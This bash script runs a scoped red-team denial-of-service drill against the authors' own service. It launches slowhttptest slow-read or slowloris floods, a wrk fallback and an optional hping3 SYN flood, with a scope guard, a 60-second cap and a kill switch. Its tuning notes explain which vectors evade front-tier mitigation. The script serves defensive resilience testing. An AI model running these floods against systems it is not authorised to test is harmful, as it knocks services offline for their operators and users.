#!/bin/bash
# 01 - Application-layer DoS (L7) against our own SI only. MAIN scenario.
# Controlled, single-source, <=60s. Attacks the app layer so the WAF / ML /
# remediation chain can actually detect and heal it.
#   Default: slowhttptest (L7) -> HighLatencyP95 / HighErrorRate / EndToEndProbeFailed
#   SYN_FLOOD=1: adds a rate-capped hping3 L4 vector (hits the host stack, a
#   layer remediation usually can't heal and can drown Prometheus/Loki - use
#   only as a separate secondary scenario, never the recovery demo).
# Usage: ./dos.sh [TARGET_IP] [PORT] [DURATION_SEC<=60]
#   Env: MODE (slowread default | slowloris), ENDPOINT (default /), CONN, RATE, SYN_FLOOD=1
# Stop: Ctrl-C, or: pkill -f slowhttptest; pkill -f hping3
set -euo pipefail
source "$(dirname "$0")/../_lib/guard.sh"

TARGET="${1:-${TARGET:-172.16.147.10}}"
PORT="${2:-${PORT:-8080}}"
DURATION="${3:-${DURATION:-45}}"
ENDPOINT="${ENDPOINT:-/}"
MODE="${MODE:-slowread}"       # slowread (lands here) | slowloris (mitigated by the front tier)
CONN="${CONN:-8000}"
RATE="${RATE:-500}"
SYN_FLOOD="${SYN_FLOOD:-0}"
ra_require_scope "$TARGET"

if [ "$DURATION" -gt 60 ]; then
  echo "[-] Refusing: DURATION=$DURATION > 60s. Keep Clip Chrono compatible."
  exit 1
fi

OUTDIR="$(ra_logdir dos)"
exec > >(tee -a "$OUTDIR/dos.log") 2>&1

echo "[*] Controlled L7 DoS: http://$TARGET:$PORT$ENDPOINT for ${DURATION}s"
echo "[*] SYN flood (L4) vector: $([ "$SYN_FLOOD" = 1 ] && echo ON || echo off)"
echo "[*] Started: $(ra_now)   Logs: $OUTDIR"
echo "[*] Blue team: watch Grafana (p95 latency, 5xx, probe_success), Prometheus req/s, Loki."
echo "[*] Kill-switch: pkill -f slowhttptest; pkill -f hping3"

cleanup() {
  echo ""; echo "[*] Stopping... $(ra_now)"
  pkill -f "slowhttptest.*$TARGET" || true
  pkill -f "hping3.*$TARGET" || true
  echo "[*] Stopped. Verify: curl -m 10 http://$TARGET:$PORT/health"
}
trap cleanup INT TERM EXIT

# Primary vector (always runs). slowread is the one that lands here: the front
# tier absorbs idle slow-HEADER sockets (slowloris) at zero cost, but slow-READ
# ties up worker/proxy buffers on a body-returning response. A larger ENDPOINT
# (e.g. the JS bundle) lands harder than "/".
if command -v slowhttptest >/dev/null 2>&1; then
  if [ "$MODE" = slowread ]; then
    echo "[*] Primary (L7): slowhttptest slow-READ (-X) -c $CONN -r $RATE -> $ENDPOINT"
    timeout "$DURATION" slowhttptest -X -u "http://$TARGET:$PORT$ENDPOINT" \
      -c "$CONN" -r "$RATE" -n 5 -w 10 -y 20 -z 32 -k 3 -g -o "$OUTDIR/slowhttptest" || true
  else
    echo "[*] Primary (L7): slowhttptest slow-HEADERS (-H) -c 300 -> $ENDPOINT  (note: mitigated here)"
    timeout "$DURATION" slowhttptest -H -t GET -u "http://$TARGET:$PORT$ENDPOINT" \
      -c 300 -i 10 -r 30 -g -o "$OUTDIR/slowhttptest" || true
  fi
elif command -v wrk >/dev/null 2>&1; then
  echo "[*] Primary (L7) fallback: wrk..."
  timeout "$DURATION" wrk -t2 -c100 -d"${DURATION}s" "http://$TARGET:$PORT$ENDPOINT" || true
else
  echo "[!] No slowhttptest/wrk found. Install one: sudo dnf install slowhttptest"
fi

# Secondary vector (opt-in, rate-capped): SYN flood. Needs root + hping3.
if [ "$SYN_FLOOD" = 1 ]; then
  if [ "$(id -u)" -eq 0 ] && command -v hping3 >/dev/null 2>&1; then
    echo "[*] Secondary (L4): hping3 SYN, rate-capped (-i u1000)..."
    timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" >"$OUTDIR/hping3.log" 2>&1 &
    wait $! || true
  else
    echo "[!] SYN_FLOOD=1 but need root + hping3; skipping L4 vector."
  fi
fi

echo "[*] Attack window ended: $(ra_now)"
trap - INT TERM EXIT
echo "[+] Verify recovery: curl -m 10 http://$TARGET:$PORT/health"
curl -m 10 -s "http://$TARGET:$PORT/health" || echo "[!] Service still down - notify Blue team."
echo ""
